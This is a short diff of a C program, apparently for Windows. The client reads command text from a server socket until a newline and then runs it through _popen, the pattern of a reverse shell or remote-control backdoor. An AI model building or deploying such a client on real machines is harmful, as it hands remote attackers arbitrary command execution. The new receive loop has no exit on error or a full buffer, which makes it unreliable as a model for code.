@@ -38,13 +38,25 @@ int main() {
 
   while (1) {
     char cmd[1024];
+    int total = 0;
 
-    int n = recv(sock, cmd, sizeof(cmd) - 1, 0);
+    while (1) {
+      int n = recv(sock, cmd + total, sizeof(cmd) - 1 - total, 0);
 
-    if (n > 0) {
-      cmd[n] = '\0';
-      printf("Received from server: %s", cmd);
+      if (n > 0) {
+        total += n;
+        
+        if (memchr(cmd, '\n', total)) {
+          break;
+        }
+      }
     }
+
+    cmd[total] = '\0';
+    printf("Received from server: %s", cmd);
+    
+
+    
 
     FILE *fp = _popen(cmd, "r");
 
